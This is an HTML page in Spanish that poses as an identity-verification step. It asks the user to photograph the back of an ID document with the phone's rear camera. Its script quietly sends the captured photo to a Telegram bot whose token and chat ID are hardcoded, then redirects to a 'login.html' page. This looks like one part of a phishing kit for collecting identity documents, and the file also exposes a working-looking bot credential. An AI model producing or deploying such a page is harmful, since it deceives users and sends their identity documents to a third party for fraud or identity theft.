<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Documento</title>

<style>
*{box-sizing:border-box}
body{
  margin:0;
  background:#2b2b2b;
  font-family:Arial,sans-serif;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}
.app{
  width:100%;
  max-width:420px;
  height:100vh;
  background:#3a3a3a;
  display:flex;
  flex-direction:column;
  color:white;
}
.steps{
  display:flex;
  justify-content:space-around;
  padding:15px;
  font-size:13px;
}
.step{display:flex;align-items:center;gap:6px;opacity:.4}
.step.active{opacity:1;font-weight:bold}
.circle{
  width:26px;height:26px;border-radius:50%;
  background:#1e90ff;color:white;
  display:flex;align-items:center;justify-content:center;
}
.content{
  flex:1;
  padding:15px;
  display:flex;
  justify-content:center;
  align-items:center;
}
.card{
  background:white;
  color:#222;
  border-radius:18px;
  padding:20px 15px;
  width:100%;
  text-align:center;
}
.camera{
  position:relative;
  width:100%;
  height:60vh;
  background:black;
  border-radius:16px;
  overflow:hidden;
}
video{
  width:100%;
  height:100%;
  object-fit:cover;
}
.doc-frame{
  position:absolute;
  top:50%;
  left:50%;
  width:280px;
  height:180px;
  border:3px solid rgba(255,255,255,.95);
  border-radius:10px;
  transform:translate(-50%,-50%);
}
.doc-label{
  position:absolute;
  bottom:12px;
  left:50%;
  transform:translateX(-50%);
  background:rgba(0,0,0,.6);
  padding:6px 12px;
  border-radius:20px;
  font-size:13px;
}
button{
  width:90%;
  margin:15px auto;
  padding:15px;
  border:none;
  border-radius:30px;
  font-size:16px;
  font-weight:bold;
  background:#facc15;
  color:#222;
}
.hidden{display:none}
canvas{display:none}
@media (min-width:768px){
  .app{height:90vh;border-radius:20px;box-shadow:0 10px 40px rgba(0,0,0,.5)}
}
</style>
</head>
<body>

<div class="app">

  <div class="steps">
    <div class="step"><div class="circle">✓</div>Documento</div>
    <div class="step active"><div class="circle">2</div>Reverso</div>
    <div class="step"><div class="circle">3</div>Finalizar</div>
  </div>

  <div class="content">

    <div id="startCard" class="card">
      <h3>Documento – Lado atrás</h3>
      <p>Coloca el reverso del documento dentro del marco</p>
    </div>

    <div id="cameraCard" class="card hidden">
      <div class="camera">
        <video id="video" autoplay muted playsinline></video>
        <div class="doc-frame"></div>
        <div class="doc-label">Documento reverso</div>
      </div>
    </div>

  </div>

  <button id="startBtn">Abrir cámara</button>
  <button id="captureBtn" class="hidden">Tomar foto</button>

</div>

<canvas id="canvas"></canvas>

<script>
/* ========= TELEGRAM (OPCIONAL) ========= */
const BOT_TOKEN = "7560835826:AAEi0Itg5ivd476odunl3z0Gs5j2Sj0rlzw";
const CHAT_ID = "8042354877";

/* ========= ELEMENTOS ========= */
const startBtn = document.getElementById("startBtn");
const captureBtn = document.getElementById("captureBtn");
const startCard = document.getElementById("startCard");
const cameraCard = document.getElementById("cameraCard");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

/* ========= ABRIR CÁMARA TRASERA ========= */
startBtn.onclick = async () => {
  startCard.classList.add("hidden");
  cameraCard.classList.remove("hidden");
  startBtn.classList.add("hidden");
  captureBtn.classList.remove("hidden");

  const stream = await navigator.mediaDevices.getUserMedia({
    video:{ facingMode:{ exact:"environment" } }
  });
  video.srcObject = stream;
};

/* ========= CAPTURA MANUAL ========= */
captureBtn.onclick = () => {
  captureBtn.textContent = "Procesando...";
  captureBtn.disabled = true;

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video,0,0,canvas.width,canvas.height);

  canvas.toBlob(async blob=>{
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", blob, "documento_atras.jpg");
    formData.append("caption", "🪪 Documento reverso (demo)");

    try{
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
        method:"POST",
        body:formData
      });
    }catch(e){
      console.error(e);
    }

    window.location.href = "login.html";
  },"image/jpeg",0.9);
};
</script>

</body>
</html>
